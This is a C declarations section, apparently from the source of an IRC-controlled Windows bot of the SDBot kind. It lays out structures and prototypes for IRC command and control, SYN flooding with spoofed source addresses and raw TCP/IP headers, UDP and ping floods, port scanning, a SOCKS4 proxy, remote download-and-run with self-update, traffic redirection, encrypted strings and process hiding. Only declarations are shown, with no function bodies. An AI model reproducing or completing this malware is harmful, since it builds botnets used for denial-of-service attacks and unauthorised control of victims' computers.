#ifndef NO_SOCK4SERV
typedef struct SOCKS4HEADER {
	u_char vn;
	u_char cd;
	unsigned short destport;
	unsigned long destaddr;
	char userid[1024];
}SOCKS4HEADER;
#endif

#ifndef NO_SCAN
 typedef struct scans {
	IN_ADDR addy;
	char chan[128];
	int port;
	int delay;
	SOCKET sock;
	int threadnum;
	DWORD host;
	BOOL silent;
	BOOL notice;
	BOOL gotinfo;
	BOOL cgotinfo;
 } scans;
#endif

typedef struct synt 
{
char ip[128];
char port[128];
char length[128];
char chan[128];
BOOL notice;
int threadnumber;
SOCKET socket;
} synt;

DWORD WINAPI synthread(LPVOID param);

 typedef struct ps {
	char host[128];
	char chan[128];
	int num;
	int size;
	int delay;
	int port;
	SOCKET sock;
	int threadnum;
	BOOL silent;
	BOOL gotinfo;
 } ps;

 typedef struct ircs {
	char host[128];
	int port;
	char channel[64];
	char chanpass[64];
	char hchan[64];
	char nick[16];
	SOCKET sock;
	int spy;
	int threadnum;
	BOOL gotinfo;
 } ircs;

 #ifndef NO_REDIRECT
 typedef struct rs {
	char dest[128];
	int port;
	int lport;
	SOCKET sock;
	SOCKET csock;
	int threadnum;
	BOOL silent;
	BOOL gotinfo;
 } rs;
 #endif

 #ifndef NO_DOWNLOAD
 typedef struct ds {
	char url[256];
	char dest[256];
	char chan[128];
	SOCKET sock;
	int run;
	int threadnum;
	int update;
	BOOL silent;
	BOOL gotinfo;
 } ds;
 #endif

 #ifndef NO_VISIT
 typedef struct vs {
	 char host[128];
	 char referer[128];
	 char chan[128];
	 SOCKET sock;
	 BOOL silent;
	 BOOL gotinfo;
 } vs;
 #endif

 typedef struct as {
	 char name[24];
	 char command[160];
 } as;

 #ifndef NO_PING
 typedef unsigned long IPAddr;
 typedef struct ip_option_information {
 	unsigned char Ttl;
 	unsigned char Tos;
 	unsigned char Flags;
 	unsigned char OptionsSize;
 	unsigned char FAR *OptionsData;
 } IP_OPTION_INFORMATION, *PIP_OPTION_INFORMATION;
 typedef struct icmp_echo_reply {
 	IPAddr Address;
 	unsigned long Status;
 	unsigned long RoundTripTime;
 	unsigned short DataSize;
 	unsigned short Reserved;
 	void FAR *Data;
 	struct ip_option_information Options;
 } ICMP_ECHO_REPLY;
  #endif

 typedef struct tagPROCESSENTRY32 {
	DWORD dwSize;
	DWORD cntUsage;
	DWORD th32ProcessID;
	DWORD *th32DefaultHeapID;
	DWORD th32ModuleID;
	DWORD cntThreads;
	DWORD th32ParentProcessID;
	LONG pcPriClassBase;
	DWORD dwFlags;
	CHAR szExeFile[MAX_PATH];
 } PROCESSENTRY32, *LPPROCESSENTRY32;

 typedef int (__stdcall *ICF)(VOID);
 ICF fIcmpCreateFile;
 typedef int (__stdcall *ISE)(HANDLE, IPAddr, LPVOID, WORD, PIP_OPTION_INFORMATION, LPVOID, DWORD, DWORD);
 ISE fIcmpSendEcho;
 typedef int (__stdcall *ICH)(HANDLE);
 ICH fIcmpCloseHandle;

 typedef int (__stdcall *IGCSE)(LPDWORD, char *, DWORD, DWORD);
 IGCSE fInternetGetConnectedStateEx;
 typedef int (__stdcall *IGCS)(LPDWORD, DWORD);
 IGCS fInternetGetConnectedState;

 typedef int (__stdcall *RSP)(DWORD, DWORD);
 RSP fRegisterServiceProcess;
 typedef HANDLE (__stdcall *CT32S)(DWORD,DWORD);
 CT32S fCreateToolhelp32Snapshot;
 typedef BOOL (__stdcall *P32F)(HANDLE,LPPROCESSENTRY32);
 P32F fProcess32First;
 typedef BOOL (__stdcall *P32N)(HANDLE,LPPROCESSENTRY32);
 P32N fProcess32Next;

 #ifndef NO_SCAN
 DWORD WINAPI ip_connect(LPVOID param);
 DWORD WINAPI ip_scan(LPVOID param);
 #endif
 int set (char **wildcard, char **test);
 int asterisk (char **wildcard, char **test);
 int wildcardfit (char *wildcard, char *test);
 int HostMaskMatch(char *h);
 #ifndef NO_SOCK4SERV
 DWORD WINAPI SocksDaemon(LPVOID param);
 DWORD WINAPI Socks4ClientThread(LPVOID pParam);
 void transfer_loop(SOCKET target, SOCKET client);
 #endif
 long SendSyn(unsigned long TargetIP, unsigned int SpoofingIP, unsigned short TargetPort,int Times);
 long SYNFlood(char *target, char *port, char *len);
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);
 char * decryptstr(char *str, int strlen);
 void addlog(char *desc);
 int addalias(char *name, char *command);
 int addthread(char *desc);
 DWORD WINAPI irc_connect(LPVOID param);
 #ifndef NO_IDENT
 DWORD WINAPI ident(LPVOID user);
 #endif
 char * rndnick(char *strbuf);
 int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, BYTE spy);
 int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char *master, char *host, int *in_channel, int repeat);
 #ifndef NO_SPY
 int irc_spyparseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server);
 #endif
 void irc_send(SOCKET sock, char *msg);
 void irc_sendf(SOCKET sock, char *msg, char *str);
 void irc_sendf2(SOCKET sock, char *msg, char *str, char *str2);
 void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice);
 char * replacestr(char *str, char *oldstr, char *newstr);
 #ifndef NO_UDP
 DWORD WINAPI udp(LPVOID param);
 #endif
 #ifndef NO_PING
 DWORD WINAPI ping(LPVOID param);
 #endif
 #ifndef NO_DOWNLOAD
 DWORD WINAPI webdownload(LPVOID param);
 #endif
 #ifndef NO_REDIRECT
 DWORD WINAPI redirect(LPVOID param);
 DWORD WINAPI redirectloop(LPVOID param);
 DWORD WINAPI redirectloop2(LPVOID param);
 #endif
 #ifndef NO_NETINFO
 char * netinfo(char *ninfo, char *host, SOCKET sock);
 #endif
 #ifndef NO_SYSINFO
 char * sysinfo(char *sinfo);
 int cpuspeed(void);
 unsigned __int64 cyclecount();
 #endif
 #ifndef NO_VISIT
 DWORD WINAPI visit(LPVOID param);
 #endif
 void uninstall(void);

 HANDLE ih;
 ircs mainirc;
 char prefix1 = prefix;
 HANDLE threads[64];
 char threadd[64][128];
 SOCKET csock[64];
 char cnick[64][16];
 char log[128][128];
 DWORD w;
 as aliases[maxaliases];
 int anum = 16;
 BOOL success = FALSE;
 char tempdir[256];
 char pbuff[65500];
 BOOL noicmp;
 BOOL noigcse;
 DWORD started;

#define IP_HDRINCL  2 
 
typedef struct ip_hdr 
{  unsigned char h_verlen; 
   unsigned char tos; 
   unsigned short total_len; 
   unsigned short ident; 
   unsigned short frag_and_flags; 
   unsigned char ttl; 
   unsigned char proto; 
   unsigned short checksum; 
   unsigned int sourceIP; 
   unsigned int destIP; 
} IPHEADER; 
 
typedef struct tsd_hdr 
{  unsigned long saddr; 
   unsigned long daddr; 
   char mbz; 
   char ptcl; 
   unsigned short tcpl; 
} PSDHEADER; 
 
typedef struct tcp_hdr 
{  USHORT th_sport; 
   USHORT th_dport; 
   unsigned int th_seq; 
   unsigned int th_ack; 
   unsigned char th_lenres; 
   unsigned char th_flag; 
   USHORT th_win; 
   USHORT th_sum; 
   USHORT th_urp; 
} TCPHEADER;